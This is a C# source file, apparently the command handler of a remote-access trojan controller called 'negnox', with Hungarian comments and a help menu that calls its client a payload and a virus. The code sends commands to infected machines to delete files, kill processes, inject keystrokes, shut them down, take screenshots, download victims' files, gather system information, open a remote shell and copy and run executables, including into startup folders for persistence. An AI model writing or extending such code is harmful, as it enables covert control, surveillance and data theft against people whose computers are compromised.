using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static negnox.Classok.TCPHelper;
using static negnox.Classok.Components;
using static negnox.Program;
using System.IO;
using System.Threading;
using konzolmenuFejlesztes;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net.Sockets;
using System.Net;

namespace negnox.Classok
{
    public static class Commandok
    {
        public static void CheckCommand(string x)
        {
            LogTxt(x);
            konzolmenu konzolmenu = new konzolmenu();
            string[] xSplittelve = x.Split(' ');
            string bemenet = parancsDarabolas(x);
            string[] bemenetek = parameterDarabolas(bemenet);
            switch (xSplittelve[0])
            {
                case "help":

                    string helpuzenet = @"|//célpontok|
target       - beállítja a célpontot
rtarget      - vissza állítja hogy ne legyen célpont
settarget    - grafikus felületű célpont beállítás
lsc          - kilistázza a klienseket
|//parancsok amik nem küldenek vissza semmit|
setwallpaper - beállít egy hátteret ("")
kys          - le killeli a futó payloadot
update       - le frissíti a futó payloadot
delete       - kitöröl fájlokat ("")
msgbox       - megjelenít egy üzenetet ([])
mousex       - elmozgatja az egeret x tengelyen
mousey       - elmozgatja az egeret y tengelyen
keystroke    - lenyomja az adott gombokat ("")
kill         - bezár futó alkalmazásokat ("")
processS     - elindít egy új Process-t ("")
logoff       - kijelentkezteti a felhasználót
shutdown     - lekapcsolja a gépet
restart      - újraindítja a gépet
audio [100]  - beállítja a hangerőt (itt pl 100-ra)
subcontroller- kezeli (ha van) másik ip címeken futó negnox kliensekre csatlakozást
reloadclient - újra indítja a már futó vírust
|//lokális parancsok|
cdme         - könyvtárat vált ("")
lsme         - ki listázza a könyvtár tartalmát
exet         - átmásol, majd el is indít egy fájlt ("")
clear        - képernyő törlése
logo         - kiírja a logót
help         - kiírja ezt az üzenetet
pwdme        - kijelzi hogy mi a jelenlegi lokális könyvtár
copy         - átmásol fájlokat a CÉLPONT gépére ("" "")     
reload       - újra indítja a listenert
|//amik vissza is adnak valamit|
cd           - könyvtár változtatás a célpont gépén          [$célpont specifikus!$]
ls           - könyvtár kilistázása a célpont gépén          [$célpont specifikus!$]
pwd          - jelenlegi tartózkodási helye a payloadnak     [$célpont specifikus!$]
download     - letölt a célpont gépéről egy adott fájlt      [$célpont specifikus!$]
grp          - vissza küld jelet hogy még él e a gép         [$célpont specifikus!$]
fsi          - fetch system info                             [$célpont specifikus!$]
frp          - fetch running processes                       [$célpont specifikus!$]
fsc          - fetch screens                                 [$célpont specifikus!$]
screenshot   - csinál egy képernyőképet                      [$célpont specifikus!$]
|//beépített programok|
rShello      - távolról vezérelhető cmd-t nyit               [$célpont specifikus!$]
             - először telepítés : ÷exet ""rSL.exe""÷
mouseC       - távolról vezérelhető desktop applikáció       [$célpont specifikus!$]
             - először telepítés : ÷exet ""MCL.exe""÷";

                    Log(helpuzenet, ConsoleColor.Yellow);
                    break;

                case "target":
                    if (xSplittelve.Length == 1)
                    {
                        if (vanTarget) Log($"Célpont : |{targetIp}|");
                        else Log("$Nincsen célpont!$");
                    }
                    else
                    {
                        targetIp = xSplittelve[1];
                        vanTarget = true;
                        File.WriteAllText("target.n", targetIp);
                        Log($"÷{targetIp}÷ |sikeresen beállítva új célpontnak:)|");
                        Console.Title = $"Negnox Console target:{targetIp}";
                    }

                    break;
                case "rtarget":
                    targetIp = "";

                    File.WriteAllText("target.n", "");
                    Console.Title = $"Negnox Console";
                    Log($"|Célpont tisztára frissítve!|");
                    vanTarget = false;
                    break;
                case "setwallpaper":

                    Send("setwallpaper");
                    Send(bemenetek[1]);
                    break;


                case "kys":
                    Console.ForegroundColor = ConsoleColor.Magenta;

                    if (xSplittelve.Length == 1)
                    {
                        Console.WriteLine("Biztos hogy meg akarod tenni?");
                        if (Console.ReadKey().Key == ConsoleKey.Y)
                        {
                            Send("kys");
                            Send("-");
                        }
                    }
                    else
                    {
                        SendTo(xSplittelve[1], xSplittelve[0]);

                        SendTo("-", xSplittelve[0]);
                    }
                    break; ;
                case "update":
                    Send("update");
                    Send("dummytext");
                    Thread.Sleep(200);
                    SendFile($".\\payload\\nclient.exe", ":DDD");
                    break;
                case "delete":
                    if (!bemenet.StartsWith("\"") || !bemenet.Contains("\""))
                    {
                        Log("$Nem helyes a szintaxis!$");
                        break;
                    }
                    Send("delete");
                    Send(bemenetek[1]);
                    break;

                case "starget":
                case "settarget":
                    string[] ipk = kliensek.Select(i => i.Client.RemoteEndPoint.ToString()).ToArray();
                    int valasztas = konzolmenu.MenuLista(ipk, 65, 20, 23, 12,
                        ConsoleColor.Black, ConsoleColor.Gray, ConsoleColor.Gray, ConsoleColor.Green, konzolmenuFejlesztes.Orientation.vertical, true, true) - 1;

                    targetIp = kliensek.Where(i => i.Client.RemoteEndPoint.ToString() == ipk[valasztas]).First().Client.RemoteEndPoint.ToString();
                    targetIp = targetIp.Split(':')[0];
                    vanTarget = true;
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Clear();
                    Log($"[|Célpont beállítva :| {targetIp}]");
                    Console.Title = $"Negnox Console target:{targetIp}";
                    break;
                case "msgbox":
                    Send("msgbox");
                    Send(bemenet);
                    break;
                case "lsc":

                    if (kliensek.Count() == 0)
                    {
                        Log("[$Nincsen csatlakozott kliens$]");
                        break;
                    }
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Csatlakozott kliensek:");
                    LogTxt("Csatlakozott kliensek:");
                    Console.WriteLine("---------------------");
                    foreach (var item in kliensek)
                    {
                        Log($"[|{item.Client.RemoteEndPoint}|]");
                    }
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("---------------------");
                    break;

                case "mousex":
                    Send("mousex");
                    Send(xSplittelve[1]);
                    break;
                case "mousey":
                    Send("mousey");
                    Send(xSplittelve[1]);
                    break;
                case "keystroke":
                    Send("keystroke");
                    Send(bemenet);
                    break;

                case "kill":
                    if (!bemenet.StartsWith("\"") || !bemenet.Contains("\""))
                    {
                        Log("$Nem helyes a szintaxis!$");
                        break;
                    }
                    Send(xSplittelve[0]);
                    Send(bemenetek[1]);
                    break;


                case "processS":
                    if (!bemenet.StartsWith("\"") || !bemenet.Contains("\""))
                    {
                        Log("$Nem helyes a szintaxis!$");
                        break;
                    }
                    Send(xSplittelve[0]);
                    Send(bemenetek[1]);
                    break;
                case "logoff":
                    Send("logoff");
                    break;

                case "shutdown":
                    Send("shutdown");
                    break;
                case "restart":
                    Send("restart");
                    break;
                //ezek ilyen cmd szeru directory mozgas dolgok lokalisan
                case "reload":
                    Directory.SetCurrentDirectory(localExePath);
                    Process.Start("negnox.exe");
                    Environment.Exit(0);
                    break;
                case "mscript":
                    MakeScript(bemenet);
                    break;
                case "cd":
                    if (!CheckTargetEnabled()) break;
                    logSendingPackets = false;
                    Send("cd");
                    Send(bemenet);
                    logSendingPackets = true;
                    break;
                case "cd..":
                    if (!CheckTargetEnabled()) break;
                    logSendingPackets = false;
                    Send("cd..");
                    Send("-");
                    logSendingPackets = true;
                    break;
                case "ls":
                    if (!CheckTargetEnabled()) break;
                    logSendingPackets = false;
                    Send("ls");
                    Send("-");
                    logSendingPackets = true;
                    break;

                case "pwd":
                    if (!CheckTargetEnabled()) break;
                    logSendingPackets = false;
                    Send("pwd");
                    Send("-");
                    logSendingPackets = true;
                    break;
                case "pwdme":
                    Console.ForegroundColor = ConsoleColor.Blue;
                    Console.WriteLine(Directory.GetCurrentDirectory());
                    LogTxt(Directory.GetCurrentDirectory());
                    break;
                case "download":
                    if (!CheckTargetEnabled()) break;
                    Send("download");
                    Send(bemenet);
                    break;
                case "cdme":
                    if (xSplittelve[1] == "..")
                    {
                        Directory.SetCurrentDirectory(Directory.GetParent(Directory.GetCurrentDirectory()).ToString());
                        //Log(Directory.GetParent(Directory.GetCurrentDirectory()).ToString());
                    }
                    else if (xSplittelve[1] == "~")
                    {
                        Directory.SetCurrentDirectory(localExePath);
                    }
                    else if (xSplittelve[1].Contains(':') || xSplittelve[1].Contains('.'))
                    {
                        Directory.SetCurrentDirectory(xSplittelve[1]);
                    }
                    else
                    {
                        string ahova = Directory.GetCurrentDirectory() + "\\" + bemenet;
                        if (Directory.Exists(ahova)) Directory.SetCurrentDirectory(ahova);
                        else Log("$Nincsen ilyen könyvtár ahova lehetne menni$");
                    }
                    break;
                case "cdme..":
                    Directory.SetCurrentDirectory(Directory.GetParent(Directory.GetCurrentDirectory()).ToString());
                    break;
                case "lsme":
                    List<string> cuccokAKonyvtarban = new List<string>();
                    Directory.GetFileSystemEntries(Directory.GetCurrentDirectory()).ToList().ForEach(a => cuccokAKonyvtarban.Add(a));
                    LogTxt(Directory.GetCurrentDirectory());
                    Console.WriteLine("Show Directory:");
                    for (int k = 0; k < 70; k++) Console.Write("-");
                    Console.WriteLine();
                    for (int i = 0; i < cuccokAKonyvtarban.Count(); i++)
                    {
                        bool mappa = (File.GetAttributes(cuccokAKonyvtarban[i]) & FileAttributes.Directory) == FileAttributes.Directory;
                        string fajlnev = Path.GetFileName(cuccokAKonyvtarban[i]);

                        //Log($"{fajlnev}");
                        Console.Write(fajlnev);
                        for (int k = 0; k < 70 - fajlnev.Length; k++)
                        {
                            Console.Write(' ');
                        }
                        if (mappa) Log("÷[MAPPA]÷");
                        else Log("|[FÁJL]|");
                    }
                    for (int k = 0; k < 70; k++) Console.Write("-");
                    Console.WriteLine();
                    break;


                case "copy":
                    if (!x.Contains('"'))
                    {
                        Log("[$Nem helyes a szintaxis! (hiányzik a \")$]"); break;
                    }
                    string filePath = bemenetek[1];
                    if (filePath.Contains("%desktop%")) filePath = filePath.Replace("%desktop%", Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                    else if (filePath.Contains("%appdata%")) filePath = filePath.Replace("%appdata%", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
                    else if (filePath.Contains("%startup%")) filePath = filePath.Replace("%startup%", Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                    else if (filePath.Contains("%startmenu%")) filePath = filePath.Replace("%startmenu%", Environment.GetFolderPath(Environment.SpecialFolder.StartMenu));
                    filePath.Replace('/', '\\');
                    if (!File.Exists(filePath))
                    {
                        Log("[Nincs ilyen fájl!]");
                        break;
                    }
                    foreach (var item in bemenetek)
                    {
                        Console.WriteLine(item);
                        LogTxt(item);
                    }
                    Console.WriteLine(bemenetek.Length);
                    LogTxt(bemenetek.Length.ToString());
                    if (bemenetek.Length == 5)
                    {
                        string hova = bemenetek[3];

                        SendFile(filePath, hova);
                    }
                    else
                    {
                        SendFile(filePath, ":DDD");
                    }
                    break;
                case "exet":
                    if (!x.Contains('"'))
                    {
                        Log("[$Nem helyes a szintaxis! (hiányzik a \")$]"); break;
                    }
                    filePath = bemenetek[1];
                    if (filePath.Contains("%desktop%")) filePath = filePath.Replace("%desktop%", Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                    else if (filePath.Contains("%appdata%")) filePath = filePath.Replace("%appdata%", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
                    else if (filePath.Contains("%startup%")) filePath = filePath.Replace("%startup%", Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                    else if (filePath.Contains("%startmenu%")) filePath = filePath.Replace("%startmenu%", Environment.GetFolderPath(Environment.SpecialFolder.StartMenu));
                    filePath.Replace('/', '\\');
                    if (!File.Exists(filePath))
                    {
                        Log("[Nincs ilyen fájl!]");
                        break;
                    }
                    if (xSplittelve.Length == 3)
                    {
                        string hova = bemenetek[3];
                        SendFile(filePath, hova);
                    }
                    else
                    {
                        SendFile(filePath, "%exetpath%");
                    }


                    Send("processS");
                    Send($"%exetpath%\\{Path.GetFileName(filePath)}");

                    break;

                //parancsok amik vissza küldenek adatot--------------------------
                case "getresponse":
                case "grp":
                    if (!CheckTargetEnabled()) break;
                    Send("getres");
                    Send("-");
                    break;
                case "fetchsysinfo":
                case "fsi":
                    if (!CheckTargetEnabled()) break;
                    Send("fsi");
                    Send("-");
                    break;

                case "fetchrunningprocesses":
                case "frp":
                    if (!CheckTargetEnabled()) break;
                    Send("frp");
                    Send("-");
                    break;


                case "getscreens":
                case "fetchscreens":
                case "fsc":
                    if (!CheckTargetEnabled()) break;
                    Send("fsc");
                    Send("-");

                    break;
                case "cmd":
                    Send("cmd");
                    Send(bemenet);
                    break;

                case "screenshot":
                    if (!CheckTargetEnabled()) break;
                    screenShotJon = true;
                    Send("screenshot");
                    Send("-");
                    break;
                case "sgl":
                    Console.WriteLine("fasz tudja mi ez a parancs de bent maradtxd");
                    LogTxt("fasz tudja mi ez a parancs de bent maradtxd");
                    break;

                case "audio":
                    Send("audio");
                    if (string.IsNullOrEmpty(bemenet)) Send("100");
                    else Send(bemenet);

                    break;


                case "script":
                    if (!File.Exists(bemenet)) {Log("$Nincs ilyen fálj!$"); break; }
                    if (!(bemenet.Split('.')[1] == "ns")) { Log("$Nincs ilyen script fálj!$"); break; }

                    foreach (string parancs in File.ReadAllLines(bemenet))
                    {
                        CheckCommand(parancs);
                    }
                    break;

                case "wait":
                    try
                    {
                        Thread.Sleep(Convert.ToInt32(bemenet));
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.ToString());
                    }
                    break;
                    //script dolgok
                case "say":


                    for (int i = 0; i < bemenet.Split('%').Length; i++)
                    {

                        if (i%2==0)
                        {
                            Console.Write(bemenet.Split('%')[i]);
                            LogTxt(bemenet.Split('%')[i]);
                        }
                        else
                        {
                            if (variables.ContainsKey(bemenet.Split('%')[i]))
                            {
                                Console.Write(variables[bemenet.Split('%')[i]]);
                                LogTxt(variables[bemenet.Split('%')[i]]);
                                break;
                            }
                            else
                            {
                                Log("$nincsen ilyen regisztrált változó$");
                            }
                        }
                       

                    }

                    //Console.WriteLine(bemenet);
                    break;
                case "listen":
                    break;
                case "if":
                    break;
                case "let":
                    string[] parancsok = bemenet.Split('=');
                    Console.WriteLine(parancsok.Length);
                    if (parancsok.Length >1)
                    {
                        if (parancsok[1].Contains('"'))
                        {
                            parancsok[1] = parancsok[1].Remove('"');
                        }
                        variables.Add(parancsok[0], parancsok[1]);
                        
                    } else variables.Add(parancsok[0], "");
                    break;


                case "subcontroller":
                    //if (!CheckTargetEnabled()) break;
                    Send("subcontroller");
                    switch (xSplittelve[1])
                    {
                        case "add":
                            Send($"add {xSplittelve[2]}");
                            break;
                        case "remove":
                            Send($"remove {xSplittelve[2]}");
                            break;
                        case "list":
                            Send($"list");
                            break;
                        default:
                            Console.WriteLine("subcontroller add 'ip cím'    - hozzá ad egy új ipt");
                            Console.WriteLine("subcontroller remove 'ip cím' - eltávolítja a bizonyos ip-t");
                            Console.WriteLine("subcontroller list 'ip cím'   - kilistázza hány negnox serverre próbál csatlakozni");
                            Send("-");
                            break;
                    }


                    break;

                case "reloadclient":
                    Send("reload");
                    Send("-");
                    break;





                case "cls":
                    Console.Clear();
                    break;
                case "clear":
                    Console.Clear();
                    break;
                case "logo":
                    Kiiratas();
                    break;

                case "mouseC":
                    if (!CheckTargetEnabled()) break;
                    Process.Start("MouseC.exe");
                    break;
                case "rShello":
                    if (!CheckTargetEnabled()) break;
                    Process.Start("rShello\\rShello.exe");
                    break;
                case "exit":
                    Environment.Exit(0);
                    break;
                default:

                    Log("$Nincs ilyen ismert parancs!$");
                    break;
            }

        }



    }
}
